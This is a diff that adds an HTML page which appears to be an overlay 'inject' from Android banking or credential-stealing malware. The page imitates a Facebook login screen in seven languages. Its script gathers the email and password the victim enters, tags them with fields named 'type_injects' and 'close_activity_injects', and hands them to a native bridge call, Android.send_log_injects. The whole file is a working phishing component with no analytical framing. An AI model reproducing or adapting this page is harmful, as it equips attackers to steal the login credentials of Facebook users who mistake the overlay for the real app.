@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en" ng-app="app">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>    
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css"></title>
+    <style>
+        body {
+            background-color: #f3f7f7;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        section {
+            flex: 1;
+            padding: 15px;
+        }
+
+        label {
+            font-weight: 600;
+            color: #18696e;
+        }
+
+        .input {
+            width: 100%;
+            padding: 8px;
+            background-color: #fff;
+            border: 1px solid #b5d5d6;
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+
+        .button {
+            width: 100%;
+            padding: 20px;
+            font-size: 14px;
+            color: #fff;
+            border: 0;
+            background-color: #18696e;
+            font-weight: bold;
+        }
+
+        input, button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        .error {
+            border-color: #f6cdcd !important;
+        }
+
+        header {
+            background-color: #fff;
+        }
+    </style>
+</head>
+<body ng-controller="c1">
+    <form onsubmit="return false">
+        <header>
+            <img style="width: 100%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABDgAAAB5CAAAAAD5MM6JAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NjRDMDVEQkJBQzBCMTFFQThGNzA4MkRGNTlDNzQxMTkiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NjRDMDVEQkNBQzBCMTFFQThGNzA4MkRGNTlDNzQxMTkiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo2NEMwNURCOUFDMEIxMUVBOEY3MDgyREY1OUM3NDExOSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo2NEMwNURCQUFDMEIxMUVBOEY3MDgyREY1OUM3NDExOSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pm++bIkAAARVSURBVHja7d3fa9VlAMdx/57PmcURW4sNC2NGJmgzL6SQFRkkqan9mkPtB6VQVg4vDEyKSPpFQ4gKu+mmwrqyyAu76KJwMvJOItjF08X5sU3PnHp2ase9Xlfn+/AwtvOwN+f7nO/3nGUF4AYt8xQAwgEIByAcgHAAwgEgHIBwAMIBCAcgHADCAQgHIByAcADCASAcgHAAwgEIByAcgHAACAcgHIBwAMIBCAeAcADCAQgHIByAcAAIByAcgHAAwgEIRykj461Gx/d6GkE45uxG0qIc48nNleO1JOsX4m9YsB8ELHg4RpIW5RhPbrIcwgFLIBzjaVGOloPCAcJxjUi00Q3hgCURjqsz0U43hAOWRjiuDEVb3RAOWCLhmJ2K9rox1//7l7vX9C4f2HTot5mDZ/YMVqtr9p0rx5K8MecP2pXkq/LHW0P9tw8Of2N1YXGEY2Ys2uxG63Ccezh1Kw5NNQanDvTUxla+dx3hONFbm1x52fLC4gjHdC7a7UbLcJwZyLSt/9RHn2sOVbbMG47h6cnfWl9YHOFoBKPtbrQKx8S9SbLh+defGEiSA7XRz5Kksnn/4R211xLXDkcy8Mzbr2xIkq3WFxZJOOrlaLsbrcKxN0n1RCmlTDyWpOenUkop65P0fV5KKX/tnD8clRcvl1KmdiR5wPrCYgnHdDna6kaLcFysJjle39fYmGR7KaX8mCSf1KdsnzccB2uDvye5w/rCoglHoxztdaNFOE4mub+xsXE6Sf9UKWUsyVBjyvW8q1LTl1StL9z64RhNMto86kvyc6ltje678XAMCgcsiVOVbUneaR49mOR0KeXJmaPCAd0Zjs5tjm5Lcqx5tEE44JYJRwffjp19qnJnkl+cqsCtEI5OXgB2MsnaxvWiszZHNwoHdHE4OnrJ+cVqkndrj6cearwdeyZJPq1P2Skc0HXh6PBNbiNJqu+XUsrk40kqtQvA1iW561QppVzaE+GAbgvHgt9Wv3Jz06lSyoXVSbJp9M1tq5Jkf23iR0lSeeSlI7v7IhzQbeFY+A/ymeF4KaX8MOsmt7/rM3c3h3qGhQO6Kxwd+OjAK8NRft3cOK6+On1b/Wj9tvreD22OQneFoxMfVnxVOEr54unBlcv7hw6enzn3+12rq9X79p8vY0mOCgd0TTiu8fUII//Z7/tCko8tG3TPqcqcX8jU6W5MXmg8mliV5Kxlg+4Jx1xfAdnx1xvPrq234vKWJOusGnRTOP4npyu57akPvjv79eF7Zl4LBgjH3EZnbaKOWjQQjvlNjfU2s9E7Zs1AOK7L5JHhu1f09K979OiflgyEAxAOQDgAhAMQDkA4AOEAhANAOADhAIQDEA5AOADhABAOQDgA4QCEAxAOAOEAhAMQDkA4AOEAEA5AOADhAIQDEA4A4QCEAxAOQDgA4QCEA0A4AOEAhAMQDkA4AIQDEA5AOADhAIQDQDgA4QCEAxAOQDgAhAMQDqDz/gVovvj9F4qVAgAAAABJRU5ErkJggg==" alt="">
+            <p style="text-align: center;font-size: 22px;color: #12595d;">{{t.__text1}}</p>
+        </header>
+        <section>
+            <label for="login">{{t.__text2}}</label>
+            <input type="email" class="input" id="login" name="login" placeholder="" required autocomplete="off">
+
+            <label for="password">{{t.__text3}}</label>
+            <input type="password" class="input" id="password" name="password" placeholder="" required autocomplete="off">
+        </section>
+        <footer>
+            <input type="submit" class="button" id="sendData" value="{{t.__text1}}">
+        </footer>
+    </form>
+
+    <script>
+        var login = document.getElementById('login'),
+            password = document.getElementById('password'),
+            sendData = document.getElementById('sendData');
+
+        sendData.onclick = () => {
+            if(!/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value)) {
+                login.classList.add('error')
+            } else {
+                login.classList.remove('error')
+            }
+
+            if(password.value.length < 5) {
+                password.classList.add('error')
+            } else {
+                password.classList.remove('error')
+            }
+
+            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value) && password.value.length > 5) {
+                var data = {};
+                data.email = login.value;
+                data.password = password.value;
+                data.type_injects = "crypt";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+            }
+        }
+    </script>
+    <script>
+        var text, 
+            link = "facebook.com", 
+            appname = "Facebook", 
+            texts = { 
+        
+                en: { 
+                    __text1: "LOG IN",
+                    __text2: "Email Address",
+                    __text3: "Password",
+                }, 
+        
+                tr: { 
+                    __text1: "GİRİŞ YAP",
+                    __text2: "E-Posta Adresi",
+                    __text3: "Şifre",
+                }, 
+                
+                es: { 
+                    __text1: "INICIO DE SESIÓN",
+                    __text2: "Dirección de correo electrónico",
+                    __text3: "Contraseña",
+                },  
+        
+                fr: { 
+                    __text1: "CONNECTER",
+                    __text2: "adresse",
+                    __text3: "Mot de passe",
+                }, 
+        
+                ro: { 
+                    __text1: "Autentificare",
+                    __text2: "Adresa de e-mail",
+                    __text3: "Parola",
+                }, 
+        
+                it: { 
+                    __text1: "LOGIN",
+                    __text2: "indirizzo",
+                    __text3: "Password",
+                },  
+        
+                de: { 
+                    __text1: "ANMELDEN",
+                    __text2: "E-Mail-Adresse",
+                    __text3: "Passwort",
+                }, 
+            }
+            var language = window.navigator.userLanguage || window.navigator.language; 
+            language = language.match(/^.{2}/), texts[language] == undefined ? text = texts.en : text = texts[language]; 
+
+            var app = angular.module("app", []); 
+            app.controller("c1", ["$scope", "$rootScope", function (t, e) { 
+                rootScope = e, 
+                scope = t, 
+                e.scums = [], 
+                t.t = text, 
+                t.reset = function () { 
+                    $(e.scums).each(function () { 
+                        this.reset() }) 
+                } 
+            }]);
+        </script>
+</body>
+</html>
